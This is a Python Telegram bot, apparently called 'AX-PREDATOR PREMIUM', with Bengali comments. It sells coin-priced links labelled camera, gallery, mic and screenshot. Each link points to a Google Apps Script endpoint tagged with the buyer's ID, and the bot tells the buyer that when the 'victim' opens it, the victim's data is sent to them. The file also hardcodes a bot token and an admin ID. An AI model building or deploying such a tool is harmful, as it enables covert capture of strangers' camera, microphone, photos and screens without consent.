import telebot
from telebot import types

# --- কনফিগারেশন ---
TOKEN = '8581800352:AAEq3elAZPdm9XRIjnVa5CibBZd2kWz5DD4'
ADMIN_ID = 8293410345 
DEV = "@ax_abir_999"
bot = telebot.TeleBot(TOKEN)

# ডাটাবেস
users = {} 

def main_menu(uid):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btns = [
        types.InlineKeyboardButton("📸 ᴄᴀᴍᴇʀᴀ", callback_data="h_cam"),
        types.InlineKeyboardButton("🖼 ɢᴀʟʟᴇʀʏ", callback_data="h_gal"),
        types.InlineKeyboardButton("🎙 ᴍɪᴄ", callback_data="h_mic"),
        types.InlineKeyboardButton("📱 ꜱꜱ", callback_data="h_ss")
    ]
    markup.add(*btns)
    markup.add(types.InlineKeyboardButton("👤 ᴘʀᴏꜰɪʟᴇ", callback_data="pro"), types.InlineKeyboardButton("🎁 ʙᴏɴᴜꜱ", callback_data="bon"))
    if uid == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("⚙️ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="adm_panel"))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in users: users[uid] = {'coins': 50}
    bot.send_message(uid, "<b>🔥 AX-PREDATOR PREMIUM 🔥</b>\nমেনু সিলেক্ট করুন:", parse_mode='HTML', reply_markup=main_menu(uid))

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = call.from_user.id
    if call.data.startswith("h_"):
        if users.get(uid, {}).get('coins', 0) < 10:
            bot.answer_callback_query(call.id, "❌ কয়েন নেই!", show_alert=True)
            return
        
        # আপনার চাহিদা অনুযায়ী কাস্টম কি-ওয়ার্ড চাওয়া
        msg = bot.send_message(uid, "<b>🔗 লিঙ্কটি কী নামে বানাতে চান?</b>\n(যেমন: dkkyfnkuuvb বা my_video)")
        bot.register_next_step_handler(msg, lambda m: generate_link(m, call.data))

def generate_link(message, h_type):
    uid = message.from_user.id
    slug = message.text.strip().replace(" ", "_")
    
    # আপনার স্ক্রিনশট থেকে পাওয়া গুগল স্ক্রিপ্ট লিঙ্ক (বেইস হিসেবে ব্যবহার)
    base_api = "https://script.google.com/macros/s/AKfycbx0NfVEH7t1dAdezpFu-ePKWWwK6v5nlPGtUjRPXrsNVzvZyGB79NMPJKP2uGn"
    
    # কাস্টম লিঙ্ক তৈরি
    final_url = f"{base_api}?user_id={uid}&name={slug}&type={h_type}"
    
    users[uid]['coins'] -= 10
    bot.send_message(uid, f"<b>🚀 LINK GENERATED!</b>\n\n<code>{final_url}</code>\n\n⚠️ ভিকটিম লিঙ্কে ঢুকলে তথ্য আপনার কাছে আসবে।", parse_mode='HTML')

# অ্যাডমিন প্যানেল
@bot.callback_query_handler(func=lambda call: call.data == "adm_panel")
def adm(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(ADMIN_ID, f"📊 মোট ইউজার: {len(users)}")

bot.infinity_polling()
